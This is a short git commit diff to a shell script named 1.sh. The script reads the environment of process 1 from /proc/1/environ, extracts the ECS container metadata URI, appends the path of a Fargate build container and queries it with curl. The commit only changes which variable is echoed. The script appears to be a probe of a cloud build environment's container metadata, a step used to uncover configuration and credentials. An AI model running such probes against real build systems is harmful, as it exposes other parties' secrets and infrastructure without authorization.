27064e9c310c25bf0889cb7f64c7184a0758307b
w2h3 <118594933+w2h3@users.noreply.github.com>
2023-03-11 16:38:07 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -3,5 +3,5 @@
 string=$(cat /proc/1/environ | sed -n 's/^.*ECS_CONTAINER_METADATA_URI=\(.*\)FLUENT_PORT=.*$/\1/p')
 string2="/containers/build-fargate-container-main"
 string3="$string$string2"
-echo "$string"
+echo "$string3"
 curl $string3
